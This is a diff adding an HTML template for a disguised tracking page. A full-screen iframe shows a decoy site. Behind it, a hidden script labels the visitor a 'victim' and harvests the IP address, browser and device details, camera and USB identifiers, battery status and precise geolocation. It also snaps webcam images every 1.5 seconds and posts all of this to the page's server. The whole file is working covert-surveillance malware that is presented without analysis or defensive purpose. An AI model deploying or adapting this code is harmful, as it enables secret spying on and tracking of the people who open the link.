@@ -1,0 +1,159 @@
+<html lang="en-US">
+<head> 
+<meta charset="UTF-8"> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
+<meta name="robots" content="noindex, nofollow"> 
+<meta name="viewport" content="width=device-width,initial-scale=1"> 
+<title></title> 
+<style>
+iframe{ 
+border:0;
+overflow:hidden;
+height:100%;
+width:100%;
+position:fixed;
+top:0;
+left:0;
+}
+</style>
+</head>
+<body>
+<video id="video" style="display:none"  playsinline autoplay></video>
+<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script type="text/javascript" defer>
+var uid="<%=uid %>";
+async function gather(){
+var td = '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
+
+td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
+var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
+var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
+///INITIALS
+td+="<br><b>📱 Device Information</b><br>";
+for(var i=0;i < xo.length;i++){ 
+if(xo[i] in navigator){
+var str = navigator[xo[i]];
+td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
+}
+}
+
+
+
+if (navigator.mediaDevices || navigator.mediaDevices.enumerateDevices) {
+/////List cameras and microphones.
+await navigator.mediaDevices.enumerateDevices()
+.then(function(devices) {
+td+="<br><b>📷 Media Device Information</b><br>";
+devices.forEach(function(device) {
+td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
+});
+})
+.catch(function(err) {
+td+="<br><b>📷 Media Device Information</b><br>";
+td+="⚠️ Media Device Error: "+err.name + ": " + err.message;
+});
+}
+
+
+////CONNECTION
+if("connection" in navigator){
+td+="<br><b>🕸️ Network Information</b><br>";
+for(var i=0;i < xoc.length;i++){ 
+var str = navigator.connection[xoc[i]];
+td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
+}}
+
+
+////USB
+if("usb" in navigator){
+await navigator.usb.getDevices()
+.then(devices => {
+td+="<br><b>🔌 Total USB devices connected:</b> " + devices.length+"<br>";
+devices.forEach(device => {
+td+="<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
+});
+});
+}
+
+if("getBattery" in navigator){
+await navigator.getBattery().then(function(battery) {
+td+="<br><b>🔋 Battery Information</b><br>";
+td+="<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging+"";
+});
+}
+
+//////Location
+if(!navigator.geolocation) {
+td+="<br><b>📍 Location Information</b><br>";
+td+="⚠️ Location API not avilable";
+} 
+
+function success(pos) {
+const crd = pos.coords;
+$.post("/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
+l=true;
+red();
+});
+}
+
+function error(err) {
+td+="<br><b>📍 Location Information</b><br>";
+td+="⚠️ Location ERROR: <code>"+err.message+"</code>";
+}
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
+}
+
+
+
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+function post(o){
+$.post("/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
+
+});
+}
+const constraints = {audio: false,video: {facingMode: "user" }};
+// Access webcam
+async function cam() {
+try {
+const stream = await navigator.mediaDevices.getUserMedia(constraints);
+handleSuccess(stream);
+} catch (e) {
+td+='<br><b>📷 Camera Images</b>';
+td+= `<br>⚠️ Camera Access Error: ${e.toString()}`;
+}
+}
+
+cam();
+// Success
+function handleSuccess(stream) {
+window.stream = stream;
+video.srcObject = stream;
+var context = canvas.getContext('2d');
+var id=setInterval(function(){
+context.drawImage(video, 0, 0, 500, 500);
+var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
+post(canvasData);
+}, 1500);
+}
+
+
+
+
+
+
+$.post("/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{console.log("done")});
+
+}
+
+gather();
+
+</script>
+  <iframe src="<%=url %>"></iframe>
+</body>
+</html>
